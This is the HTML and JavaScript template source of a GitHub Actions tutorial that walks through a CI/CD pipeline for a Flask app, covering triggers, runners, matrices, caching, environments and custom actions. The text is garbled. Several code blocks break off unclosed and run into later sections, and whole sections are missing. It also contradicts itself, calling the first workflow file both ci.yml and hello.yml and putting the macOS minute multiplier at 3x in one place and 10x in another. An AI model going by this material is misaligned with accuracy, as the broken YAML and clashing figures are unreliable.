a{color:var(--blue);text-decoration:none}

section{margin-bottom:48px;scroll-margin-top:80px}

p.desc{color:var(--text2);font-size:15px;line-height:1.8;margin:10px 0}

<!-- ===== 1. INTRODUCTION ===== -->
<section id="intro">
<h2><span class="sec-icon">🚀</span>Introduction</h2>
<p class="desc">GitHub Actions is GitHub's built-in CI/CD and automation platform. It lets you automate your software development workflows directly in your GitHub repository. Every time something happens in your repo — a push, pull request, issue creation, or even a scheduled time — GitHub Actions can automatically run a series of commands for you.</p>

<h3>Why GitHub Actions?</h3>
${featureGrid([
["🏠","Native to GitHub","No external CI/CD service needed. Lives right where your code is."],
["💰","Free tier generous","2,000 minutes/month free for public repos, 500 for private."],
["🛒","Marketplace","17,000+ pre-built actions ready to use from the community."],
["📐","Matrix builds","Test across multiple OS, language versions, and configs in parallel."],
["🔐","Secrets management","Built-in encrypted secrets for API keys, tokens, and credentials."],
["🐳","Container support","Run jobs in Docker containers or build and push images natively."]
])}

<h3>What we'll build together</h3>
<p class="desc">Throughout this guide, we'll build a complete CI/CD pipeline for a Python Flask application. Here's our example app:</p>

${code("app.py","python",`from flask import Flask, jsonify

app = Flask(__name__)

@app.route("/")
def home():
    return jsonify({"message": "Hello from CI/CD!", "status": "healthy"})

@app.route("/health")
def health():
    return jsonify({"status": "ok", "version": "1.0.0"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)`)}

${code("test_app.py","python",`import pytest
from app import app

@pytest.fixture
def client():
    app.config["TESTING"] = True
    with app.test_client() as client:
        yield client

def test_home(client):
    resp = client.get("/")
    data = resp.get_json()
    assert resp.status_code == 200
    assert data["status"] == "healthy"

def test_health(client):
    resp = client.get("/health")
    data = resp.get_json()
    assert resp.status_code == 200
    assert data["status"] == "ok"`)}

<h3>Your first workflow file</h3>
<p class="desc">Create <code>.github/workflows/ci.yml</code> — this is the simplest possible workflow:</p>
${code(".github/workflows/hello.yml","yaml",`name: Hello GitHub Actions     # Display name in the Actions tab

on: [push]                      # Trigger: runs on every push

jobs:
  greet:                        # Job ID (must be unique within workflow)
    runs-on: ubuntu-latest      # Runner: GitHub-hosted Ubuntu machine

<!-- ===== 3. BUILDING BLOCKS ===== -->
<section id="blocks">
<h2><span class="sec-icon">🧱</span>GitHub Actions building blocks</h2>
<p class="desc">Every workflow is made of the same fundamental pieces. Understanding them is the key to mastering GitHub Actions.</p>

${diagram(`┌─────────────────────────────────────────────────┐
│                  WORKFLOW (.yml file)            │
│                                                  │
│  ┌──────────────────┐   ┌──────────────────┐    │
│  │     JOB 1        │   │     JOB 2        │    │
│  │  (runs on VM 1)  │──▶│  (runs on VM 2)  │    │
│  │                   │   │                   │    │
│  │  ┌─────────────┐ │   │  ┌─────────────┐ │    │
│  │  │   Step 1    │ │   │  │   Step 1    │ │    │
│  │  │ (checkout)  │ │   │  │  (deploy)   │ │    │
│  │  └──────┬──────┘ │   │  └─────────────┘ │    │
│  │  ┌──────▼──────┐ │   │                   │    │
│  │  │   Step 2    │ │   └──────────────────┘    │
│  │  │ (run tests) │ │                            │
│  │  └──────┬──────┘ │       EVENT TRIGGER        │
│  │  ┌──────▼──────┐ │    (push, PR, schedule,    │
│  │  │   Step 3    │ │     manual, webhook)       │
│  │  │  (lint)     │ │                            │
│  │  └─────────────┘ │                            │
│  └──────────────────┘                            │
└─────────────────────────────────────────────────┘`)}

<h3>The hierarchy explained</h3>
<p class="desc"><strong>Workflow:</strong> A configurable automated process defined in a YAML file. A repo can have many workflows, each triggered by different events.</p>
<p class="desc"><strong>Job:</strong> A set of steps that execute on the same runner (virtual machine). Jobs run in parallel by default. You can make them sequential with <code>needs:</code>.</p>
<p class="desc"><strong>Step:</strong> An individual task within a job. Each step either runs a shell command (<code>run:</code>) or uses a pre-built action (<code>uses:</code>). Steps always run sequentially within a job.</p>
<p class="desc"><strong>Action:</strong> A reusable unit of code. Can be from the GitHub Marketplace, your own repo, or a Docker container.</p>
<p class="desc"><strong>Runner:</strong> The server that runs your workflows. GitHub provides hosted runners (Ubuntu, Windows, macOS) or you can self-host your own.</p>

${callout("warning","Key distinction","Jobs get their own fresh virtual machine — they share nothing by default. Steps within a job share the same filesystem and environment. This means if Step 1 installs Python packages, Step 2 can use them, but Job 2 cannot.")}

<h3>Complete anatomy of a workflow file</h3>
${code(".github/workflows/ci.yml — annotated","yaml",`# ──────────────────────────────────────────────────
# LEVEL 1: Workflow metadata
# ──────────────────────────────────────────────────
name: Python CI Pipeline        # Shows in the Actions tab UI

# ──────────────────────────────────────────────────
# LEVEL 2: Event triggers — WHEN does this run?
# ──────────────────────────────────────────────────
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

# ──────────────────────────────────────────────────
# LEVEL 3: Environment variables (available to all jobs)
# ──────────────────────────────────────────────────
env:
  PYTHON_VERSION: "3.11"
  APP_NAME: "my-python-app"

# ──────────────────────────────────────────────────
# LEVEL 4: Jobs — WHAT runs?
# ──────────────────────────────────────────────────
jobs:
  test:                          # Job ID
    name: Run tests              # Display name
    runs-on: ubuntu-latest       # Runner type

    steps:
      # Step using a pre-built action
      - name: Checkout code
        uses: actions/checkout@v4

      # Step using a pre-built action with inputs
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: \${{ env.PYTHON_VERSION }}

      # Step running shell commands
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt

      # Step running tests
      - name: Run pytest
        run: pytest test_app.py -v --tb=short`)}
</section>

<!-- ===== 4. EVENT TRIGGERS ===== -->
<section id="triggers">
<h2><span class="sec-icon">⚡</span>Event triggers</h2>
<p class="desc">The <code>on:</code> key defines when your workflow runs. GitHub supports 35+ event types. Here are the most important ones for CI/CD:</p>

${code("All major trigger types","yaml",`on:
  # ── Code events ──
  push:                          # Any push to the repo
    branches: [main, develop]    # Only these branches
  pull_request:                  # PR opened, updated, or reopened
    branches: [main]

  # ── Manual triggers ──
  workflow_dispatch:             # "Run workflow" button in UI
    inputs:                      # Custom inputs shown in UI
      environment:
        description: "Deploy target"
        required: true
        default: "staging"
        type: choice
        options: [staging, production]
      debug:
        description: "Enable debug logging"
        type: boolean
        default: false

  # ── Scheduled (cron) ──
  schedule:
    - cron: "30 5 * * 1-5"      # 5:30 AM UTC, weekdays only
    # ┬ ┬ ┬ ┬ ┬
    # │ │ │ │ └── Day of week (0=Sun, 1=Mon ... 6=Sat)
    # │ │ │ └──── Month (1-12)
    # │ │ └────── Day of month (1-31)
    # │ └──────── Hour (0-23)
    # └────────── Minute (0-59)

  # ── Other repo events ──
  issues:
    types: [opened, labeled]
  release:
    types: [published]
  workflow_call:                 # Called by another workflow
  repository_dispatch:          # External webhook trigger`)}

<h3>Practical example: multi-trigger pipeline</h3>
${code(".github/workflows/smart-ci.yml","yaml",`name: Smart CI

on:
  push:
    branches: [main]
    paths:
      - "**.py"                  # Only run if Python files change
      - "requirements.txt"
      - "Dockerfile"
  pull_request:
    branches: [main]
  schedule:
    - cron: "0 6 * * 1"         # Weekly security scan, Monday 6AM
  workflow_dispatch:             # Manual trigger for emergencies

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - run: pip install -r requirements.txt
      - run: pytest test_app.py -v

  security-scan:
    if: github.event_name == 'schedule' || github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install safety bandit
      - run: safety check -r requirements.txt
      - run: bandit -r . -ll`)}

${callout("info","Pro tip: path filtering","Use <code>paths:</code> and <code>paths-ignore:</code> to avoid running expensive CI on documentation-only changes. This saves runner minutes and speeds up your feedback loop.")}
</section>

<!-- ===== 5. RUNNERS ===== -->
<section id="runners">
<h2><span class="sec-icon">💻</span>Workflow runners</h2>
<p class="desc">Runners are the machines that execute your jobs. GitHub provides hosted runners, or you can set up your own self-hosted runners for custom needs.</p>

<h3>GitHub-hosted runners</h3>
${featureGrid([
["🐧","ubuntu-latest","Ubuntu 22.04. Most common. 2-core, 7GB RAM, 14GB SSD."],
["🪟","windows-latest","Windows Server 2022. For .NET, PowerShell, or Windows-only builds."],
["🍎","macos-latest","macOS 14 (Sonoma). For iOS/macOS builds. 3x the minute cost."],
["🐧","ubuntu-24.04","Pin specific OS version for reproducibility instead of 'latest'."]
])}

<h3>Self-hosted runners & containers</h3>
${code("Runners, containers, and services","yaml",`jobs:
  ml-training:
    # Self-hosted runner with GPU and Linux
    runs-on: [self-hosted, linux, gpu]
    steps:
      - uses: actions/checkout@v4
      - name: Train model
        run: python train.py --epochs 100

  # Use a container inside any runner
  containerized-job:
    runs-on: ubuntu-latest
    container:
      image: python:3.11-slim    # Run entire job in this container
      env:
        APP_ENV: testing
    steps:
      - uses: actions/checkout@v4
      - run: python -c "import sys; print(sys.version)"

  # Service containers (databases, caches for testing)
  integration-tests:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: testpass
          POSTGRES_DB: testdb
        ports: ["5432:5432"]
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      redis:
        image: redis:7
        ports: ["6379:6379"]
    steps:
      - uses: actions/checkout@v4
      - run: pip install -r requirements.txt
      - name: Run integration tests
        env:
          DATABASE_URL: postgresql://postgres:testpass@localhost:5432/testdb
          REDIS_URL: redis://localhost:6379
        run: pytest tests/integration/ -v`)}

${callout("warning","Runner minute costs","Linux runners: 1x multiplier. Windows: 2x. macOS: 10x. For a budget-conscious project, run everything possible on Linux and only use macOS/Windows for platform-specific testing.")}

<!-- ===== 6. THIRD-PARTY ACTIONS ===== -->
<section id="actions">
<h2><span class="sec-icon">📦</span>Using third-party actions</h2>
<p class="desc">Actions are reusable units of code that perform common tasks. The GitHub Marketplace has 17,000+ actions.</p>

<h3>Action syntax</h3>
${code("Action reference formats","yaml",`steps:
  # Format: owner/repo@ref
  - uses: actions/checkout@v4          # Official GitHub action
  - uses: actions/setup-python@v5      # Another official action

  # Pin to exact commit SHA (most secure)
  - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608

  # Use a Docker Hub image directly
  - uses: docker://alpine:3.18

  # Use action from the same repository
  - uses: ./.github/actions/my-custom-action`)}

<h3>Essential actions for Python DevOps</h3>
${code("Must-know actions","yaml",`jobs:
  full-pipeline:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0            # Full history for changelog

      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: "pip"              # Auto-cache pip downloads

      - run: pip install -r requirements.txt
      - run: flake8 . --count --show-source --statistics
      - run: black --check .
      - run: pytest --cov=app --cov-report=xml -v

      - uses: codecov/codecov-action@v3
        with:
          files: ./coverage.xml
          fail_ci_if_error: true

      - uses: docker/build-push-action@v5
        with:
          context: .
          push: false
          tags: myapp:test

      - uses: slackapi/slack-github-action@v1.25.0
        if: failure()
        with:
          payload: |
            {"text":"CI Failed on \${{ github.repository }}"}
        env:
          SLACK_WEBHOOK_URL: \${{ secrets.SLACK_WEBHOOK }}`)}

${callout("danger","Security: always pin actions","Never use <code>@main</code> or <code>@master</code> for third-party actions in production. A compromised repo could inject malicious code. Use SHA pinning: <code>uses: actions/checkout@8ade135...</code> or at minimum a version tag like <code>@v4</code>.")}
</section>

<!-- ===== 7. EVENT FILTERS ===== -->
<section id="filters">
<h2><span class="sec-icon">🔍</span>Event filters & activity types</h2>
<p class="desc">Fine-tune exactly when your workflows trigger using filters and activity types. This prevents unnecessary workflow runs and saves CI minutes.</p>

${code("Filtering triggers precisely","yaml",`on:
  push:
    branches:
      - main
      - "release/**"             # release/1.0, release/2.0, etc.
      - "!release/**-beta"       # Exclude beta releases
    tags:
      - "v*"                     # v1.0, v2.1.3, etc.
    paths:
      - "src/**"
      - "tests/**"
      - "requirements.txt"
    paths-ignore:
      - "docs/**"
      - "**.md"

  pull_request:
    branches: [main]
    types:
      - opened                   # New PR created
      - synchronize              # New commits pushed to PR
      - reopened                 # Previously closed PR reopened

  issues:
    types: [opened, labeled]

  release:
    types: [published]`)}

<h3>Practical example: monorepo filtering</h3>
${code("Efficient monorepo CI","yaml",`name: Monorepo CI
on:
  push:
    branches: [main]

jobs:
  detect-changes:
    runs-on: ubuntu-latest
    outputs:
      api_changed: \${{ steps.filter.outputs.api }}
      frontend_changed: \${{ steps.filter.outputs.frontend }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v2
        id: filter
        with:
          filters: |
            api:
              - "api/**"
              - "shared/**"
            frontend:
              - "frontend/**"
              - "shared/**"

  test-api:
    needs: detect-changes
    if: needs.detect-changes.outputs.api_changed == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cd api && pip install -r requirements.txt && pytest

  test-frontend:
    needs: detect-changes
    if: needs.detect-changes.outputs.frontend_changed == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cd frontend && npm ci && npm test`)}
</section>

<!-- ===== 8. CONTEXTS & EXPRESSIONS ===== -->
<section id="contexts">
<h2><span class="sec-icon">📐</span>Contexts, expressions & variables</h2>
<p class="desc">GitHub Actions provides context objects that give you information about the workflow run, repository, event, and more. Expressions let you dynamically compute values.</p>

${code("Contexts and expressions deep dive","yaml",`jobs:
  context-demo:
    runs-on: ubuntu-latest
    env:
      DEPLOY_ENV: production
      APP_VERSION: "2.1.0"

    steps:
      - uses: actions/checkout@v4

      # github context
      - name: GitHub context examples
        run: |
          echo "Repo: \${{ github.repository }}"
          echo "SHA: \${{ github.sha }}"
          echo "Branch: \${{ github.ref_name }}"
          echo "Event: \${{ github.event_name }}"
          echo "Actor: \${{ github.actor }}"
          echo "Run ID: \${{ github.run_id }}"
          echo "Run number: \${{ github.run_number }}"

      # runner context
      - name: Runner context
        run: |
          echo "OS: \${{ runner.os }}"
          echo "Arch: \${{ runner.arch }}"
          echo "Temp dir: \${{ runner.temp }}"

      # secrets context
      - name: Using secrets (values are masked in logs)
        env:
          API_KEY: \${{ secrets.API_KEY }}
        run: echo "API key is set: \${{ secrets.API_KEY != '' }}"

      # Expressions with operators
      - name: Conditional step
        if: |
          github.event_name == 'push' &&
          github.ref == 'refs/heads/main' &&
          !contains(github.event.head_commit.message, '[skip ci]')
        run: echo "Running on main, no skip"

      # Setting output variables
      - name: Set dynamic variables
        id: vars
        run: |
          echo "version=1.2.3" >> \$GITHUB_OUTPUT
          echo "timestamp=\$(date -u +%Y%m%d%H%M%S)" >> \$GITHUB_OUTPUT
          echo "short_sha=\$(git rev-parse --short HEAD)" >> \$GITHUB_OUTPUT

      - name: Use dynamic variables
        run: |
          echo "Version: \${{ steps.vars.outputs.version }}"
          echo "Timestamp: \${{ steps.vars.outputs.timestamp }}"
          echo "Tag: \${{ steps.vars.outputs.version }}-\${{ steps.vars.outputs.short_sha }}"`)}

${callout("info","secrets vs vars","Use <code>secrets</code> for sensitive data (API keys, passwords, tokens) — they're encrypted and masked in logs. Use <code>vars</code> for non-sensitive configuration (URLs, app names, feature flags) — they're visible in logs.")}
</section>

<!-- ===== 9. FUNCTIONS ===== -->
<section id="functions">
<h2><span class="sec-icon">🧮</span>Functions</h2>
<p class="desc">GitHub Actions provides built-in functions you can use in expressions. These are essential for conditional logic, string manipulation, and dynamic workflows.</p>

${code("Built-in functions reference","yaml",`jobs:
  functions-demo:
    runs-on: ubuntu-latest
    steps:
      # Status check functions
      - name: Always run (even if previous steps fail)
        if: always()
        run: echo "I run no matter what"

      - name: Only on failure
        if: failure()
        run: echo "Something broke!"

      - name: Only on success
        if: success()
        run: echo "All green!"

      # String functions
      - name: String manipulation
        if: |
          contains(github.event.head_commit.message, '[deploy]') &&
          startsWith(github.ref, 'refs/heads/release') &&
          endsWith(github.repository, '-api')
        run: echo "Deploying release branch of API repo"

      # format()
      - name: Format strings
        run: echo "\${{ format('Deploy {0} to {1}', 'v2.0', 'production') }}"

      # JSON functions
      - name: Parse JSON dynamically
        id: meta
        run: echo 'config={"env":"prod","replicas":3}' >> \$GITHUB_OUTPUT

      - name: Use JSON values
        run: |
          echo "Env: \${{ fromJSON(steps.meta.outputs.config).env }}"
          echo "Replicas: \${{ fromJSON(steps.meta.outputs.config).replicas }}"

      # toJSON for debugging
      - name: Debug contexts
        run: echo '\${{ toJSON(github) }}'

      # hashFiles() for cache keys
      - uses: actions/cache@v3
        with:
          path: ~/.cache/pip
          key: pip-\${{ runner.os }}-\${{ hashFiles('**/requirements.txt') }}`)}

${callout("info","Type coercion","GitHub Actions automatically converts types in comparisons. The string <code>\"true\"</code> equals the boolean <code>true</code>. Numbers are compared as numbers. Use <code>fromJSON()</code> when you need explicit type control.")}
</section>

<!-- ===== 10. EXECUTION FLOW ===== -->
<section id="flow">
<h2><span class="sec-icon">🔀</span>Controlling execution flow</h2>
<p class="desc">Control when jobs and steps run using conditionals, dependencies, and failure handling strategies.</p>

<h3>Job dependencies with <code>needs:</code></h3>
${code("Complex job dependency graph","yaml",`name: Full CI/CD Pipeline
on:
  push:
    branches: [main]

jobs:
  # Stage 1: Parallel checks
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install flake8 black
      - run: flake8 . && black --check .

  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install -r requirements.txt
      - run: pytest test_app.py -v

  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install safety bandit
      - run: safety check -r requirements.txt
      - run: bandit -r app.py -ll

  # Stage 2: Build (needs all checks)
  build:
    needs: [lint, test, security]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t myapp:\${{ github.sha }} .

  # Stage 3: Deploy
  deploy-staging:
    needs: build
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - run: echo "Deploying to staging..."

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment: production
    if: github.ref == 'refs/heads/main'
    steps:
      - run: echo "Deploying to production..."

  # Notification: runs even if something fails
  notify:
    needs: [deploy-staging, deploy-production]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - run: |
          if [ "\${{ needs.deploy-production.result }}" == "success" ]; then
            echo "✅ Pipeline succeeded"
          else
            echo "❌ Pipeline had failures"
          fi`)}

${diagram(`Pipeline execution flow:

  ┌──────┐  ┌──────┐  ┌──────────┐
  │ Lint │  │ Test │  │ Security │   Stage 1: Parallel
  └──┬───┘  └──┬───┘  └────┬─────┘
     │         │            │
     └─────────┼────────────┘
               │
          ┌────▼────┐
          │  Build  │                Stage 2: Sequential
          └────┬────┘
               │
        ┌──────▼──────┐
        │   Staging   │              Stage 3: With approval
        └──────┬──────┘
               │
      ┌────────▼────────┐
      │   Production    │            Stage 4: Protected
      └────────┬────────┘
               │
          ┌────▼────┐
          │ Notify  │  if: always()
          └─────────┘`)}

<h3>Conditional execution patterns</h3>
${code("if: conditions at step and job level","yaml",`jobs:
  conditional-demo:
    runs-on: ubuntu-latest
    steps:
      - name: Main branch only
        if: github.ref == 'refs/heads/main'
        run: echo "On main"

      - name: Feature branches only
        if: github.ref != 'refs/heads/main'

      - name: Skip if [skip ci]

<!-- ===== 12. CACHING & ARTIFACTS ===== -->
<section id="caching">
<h2><span class="sec-icon">💾</span>Sharing data: caching & artifacts</h2>
<p class="desc">Caching speeds up workflows by reusing files between runs. Artifacts persist files after a workflow completes for download or use by other jobs.</p>

${code("Pip caching strategies","yaml",`jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Method 1: Built-in cache in setup-python
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: "pip"

      # Method 2: Explicit cache action (more control)
      - name: Cache pip packages
        uses: actions/cache@v3
        id: pip-cache
        with:
          path: |
            ~/.cache/pip
            .venv
          key: pip-\${{ runner.os }}-\${{ hashFiles('**/requirements*.txt') }}
          restore-keys: |
            pip-\${{ runner.os }}-

      - name: Install dependencies
        if: steps.pip-cache.outputs.cache-hit != 'true'
        run: |
          python -m venv .venv
          source .venv/bin/activate
          pip install -r requirements.txt`)}

<h3>Workflow artifacts</h3>
${code("Upload and download artifacts between jobs","yaml",`jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "3.11" }
      - run: pip install -r requirements.txt
      - run: pytest test_app.py --cov=. --cov-report=html -v

      - name: Upload coverage report
        uses: actions/upload-artifact@v4
        with:
          name: coverage-report
          path: htmlcov/
          retention-days: 30

      - run: docker build -t myapp:\${{ github.sha }} .
      - run: docker save myapp:\${{ github.sha }} > myapp-image.tar

      - name: Upload Docker image
        uses: actions/upload-artifact@v4
        with:
          name: docker-image
          path: myapp-image.tar

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: docker-image
      - run: |
          docker load < myapp-image.tar
          echo "Deploying myapp:\${{ github.sha }}"`)}

${callout("info","Cache vs artifacts","<strong>Cache:</strong> Speeds up workflows by reusing files between runs (same workflow). Auto-evicted after 7 days. Use for dependencies.<br><strong>Artifacts:</strong> Persist files after workflow completes. Can be downloaded from UI. Use for build outputs, test reports, Docker images.")}
</section>

<!-- ===== 13. MATRICES ===== -->
<section id="matrix">
<h2><span class="sec-icon">📊</span>Working with matrices</h2>
<p class="desc">Matrix strategies let you run a job with multiple combinations of variables — perfect for testing across Python versions, OSes, or database versions.</p>

${code("Matrix strategy examples","yaml",`jobs:
  # Basic matrix: test across Python versions and OS
  test:
    strategy:
      matrix:
        python-version: ["3.9", "3.10", "3.11", "3.12"]
        os: [ubuntu-latest, windows-latest, macos-latest]
      fail-fast: false
      max-parallel: 4
    runs-on: \${{ matrix.os }}
    name: Py\${{ matrix.python-version }} on \${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: \${{ matrix.python-version }}
      - run: pip install -r requirements.txt
      - run: pytest test_app.py -v

  # Advanced: include/exclude specific combinations
  advanced-test:
    strategy:
      matrix:
        python-version: ["3.10", "3.11", "3.12"]
        database: [postgres, sqlite]
        include:
          - python-version: "3.12"
            database: postgres
            experimental: true
        exclude:
          - python-version: "3.10"
            database: postgres
    runs-on: ubuntu-latest
    continue-on-error: \${{ matrix.experimental || false }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: \${{ matrix.python-version }}
      - run: pip install -r requirements.txt
      - run: pytest test_app.py -v
        env:
          DB_TYPE: \${{ matrix.database }}

  # Dynamic matrix from JSON
  prepare:
    runs-on: ubuntu-latest
    outputs:
      matrix: \${{ steps.set.outputs.matrix }}
    steps:
      - id: set
        run: |
          echo 'matrix={"include":[
            {"service":"api","path":"services/api"},
            {"service":"worker","path":"services/worker"}
          ]}' >> \$GITHUB_OUTPUT

  test-services:
    needs: prepare
    strategy:
      matrix: \${{ fromJSON(needs.prepare.outputs.matrix) }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cd \${{ matrix.path }} && pytest -v`)}
</section>

<!-- ===== 14. ENVIRONMENTS ===== -->
<section id="envs">
<h2><span class="sec-icon">🌍</span>Environments</h2>
<p class="desc">Environments add protection rules, secrets scoping, and deployment tracking to your workflows.</p>

${code("Environment configuration and usage","yaml",`jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.myapp.com
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to staging
        env:
          AWS_ACCESS_KEY: \${{ secrets.AWS_ACCESS_KEY }}
          API_ENDPOINT: \${{ vars.API_ENDPOINT }}
        run: echo "Deploying to staging at \$API_ENDPOINT"

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://myapp.com
    if: |
      github.ref == 'refs/heads/main' &&
      github.event.repository.fork == false
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        run: echo "🚀 Deploying to production!"

  # Docker deployment with GHCR
  docker-deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v4
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: \${{ github.actor }}
          password: \${{ secrets.GITHUB_TOKEN }}
      - uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: |
            ghcr.io/\${{ github.repository }}:latest
            ghcr.io/\${{ github.repository }}:\${{ github.sha }}`)}

${callout("warning","Setting up environment protection","Go to <strong>Settings → Environments → New environment</strong>. Add required reviewers for production. Set a 5-minute wait timer as a safety net. Restrict to only the <code>main</code> branch.")}
</section>

<!-- ===== 15. CUSTOM ACTIONS ===== -->
<section id="custom">
<h2><span class="sec-icon">⚙️</span>Developing custom actions from scratch</h2>
<p class="desc">When marketplace actions don't fit your needs, build your own. There are three types: JavaScript, composite, and Docker container actions.</p>

<h3>Type 1: Composite action (easiest — YAML only)</h3>
${code(".github/actions/python-setup/action.yml","yaml",`name: "Python Setup & Test"
description: "Sets up Python, installs deps, and runs tests"

inputs:
  python-version:
    description: "Python version to use"
    required: false
    default: "3.11"
  requirements-file:
    description: "Path to requirements file"
    required: false
    default: "requirements.txt"

outputs:
  test-result:
    description: "Test pass/fail status"
    value: \${{ steps.test.outputs.result }}

runs:
  using: "composite"
  steps:
    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: \${{ inputs.python-version }}
        cache: "pip"

    - name: Install dependencies
      shell: bash
      run: |
        python -m pip install --upgrade pip
        pip install -r \${{ inputs.requirements-file }}
        pip install pytest pytest-cov

    - name: Run tests
      id: test
      shell: bash
      run: |
        if pytest --cov -v; then
          echo "result=success" >> \$GITHUB_OUTPUT
        else
          echo "result=failure" >> \$GITHUB_OUTPUT
          exit 1
        fi`)}

${code("Using the composite action","yaml",`jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Setup and test
        id: test
        uses: ./.github/actions/python-setup
        with:
          python-version: "3.12"
      - run: echo "Tests: \${{ steps.test.outputs.test-result }}"`)}

<h3>Type 2: Docker container action</h3>
${code(".github/actions/security-scan/Dockerfile","dockerfile",`FROM python:3.11-slim
RUN pip install safety bandit
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]`)}

${code(".github/actions/security-scan/entrypoint.sh","bash",`#!/bin/bash
set -e
SEVERITY=\${1:-medium}
echo "🔍 Running security scan (severity: \$SEVERITY)..."

# Run safety check
safety check -r requirements.txt

# Run bandit
bandit -r . -ll

echo "✅ No vulnerabilities found"`)}
</section>

<!-- ===== 16. REUSABLE WORKFLOWS ===== -->
<section id="reusable">
<h2><span class="sec-icon">♻️</span>Creating reusable workflows</h2>
<p class="desc">Reusable workflows let you define an entire workflow once and call it from other workflows — like functions for CI/CD.</p>

${code("Reusable workflow (callee)","yaml",`name: Reusable Python CI
on:
  workflow_call:
    inputs:
      python-version:
        type: string
        default: "3.11"
      run-security-scan:
        type: boolean
        default: true
    secrets:
      deploy-token:
        required: true
    outputs:
      test-result:
        value: \${{ jobs.test.outputs.result }}

jobs:
  test:
    runs-on: ubuntu-latest
    outputs:
      result: \${{ steps.test.outputs.result }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: \${{ inputs.python-version }}
          cache: "pip"
      - run: pip install -r requirements.txt
      - id: test
        run: |
          pytest -v && echo "result=pass" >> \$GITHUB_OUTPUT

  security:
    if: inputs.run-security-scan
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install safety bandit
      - run: safety check -r requirements.txt`)}

${code("Caller workflow","yaml",`name: Deploy Pipeline
on:
  push:
    branches: [main]

jobs:
  ci:
    uses: ./.github/workflows/reusable-python-ci.yml
    with:
      python-version: "3.12"
      run-security-scan: true
    secrets:
      deploy-token: \${{ secrets.DEPLOY_TOKEN }}

  post-ci:
    needs: ci
    runs-on: ubuntu-latest
    steps:
      - run: echo "Test result: \${{ needs.ci.outputs.test-result }}"`)}

${callout("info","Actions vs reusable workflows","<strong>Custom actions:</strong> Reusable <em>steps</em>. Run within a job. Good for: setup tasks, notifications.<br><strong>Reusable workflows:</strong> Reusable <em>jobs</em>. Run as a complete workflow. Good for: entire CI pipelines, standardized company workflows.")}
</section>

<!-- ===== 17. CONCURRENCY ===== -->
<section id="concurrency">
<h2><span class="sec-icon">🔒</span>Managing concurrency</h2>
<p class="desc">Concurrency controls prevent multiple workflow runs from conflicting — especially critical for deployments.</p>

${code("Concurrency strategies","yaml",`# Strategy 1: Cancel outdated runs
name: CI
on: [push, pull_request]
concurrency:
  group: ci-\${{ github.ref }}
  cancel-in-progress: true       # Cancel older runs

---
# Strategy 2: Queue deployments (don't cancel!)
name: Deploy
on:
  push:
    branches: [main]
concurrency:
  group: deploy-production
  cancel-in-progress: false      # Queue instead

---
# Strategy 3: Per-PR concurrency
name: PR Checks
on: pull_request
concurrency:
  group: pr-\${{ github.event.pull_request.number }}
  cancel-in-progress: true

---
# Strategy 4: Job-level concurrency
name: Mixed Pipeline
on:
  push:
    branches: [main]
jobs:
  test:
    runs-on: ubuntu-latest       # No concurrency limit
    steps:
      - uses: actions/checkout@v4
      - run: pytest -v

  deploy:
    needs: test
    runs-on: ubuntu-latest
    concurrency:                 # But deploys are serialized
      group: deploy-\${{ github.ref }}
      cancel-in-progress: false
    steps:
      - run: echo "Deploy is serialized"`)}

${callout("warning","Don't cancel deployments","Always use <code>cancel-in-progress: false</code> for deployment jobs. Cancelling a mid-flight deployment can leave your infrastructure in a broken state.")}
</section>

<!-- ===== 18. SECURITY ===== -->
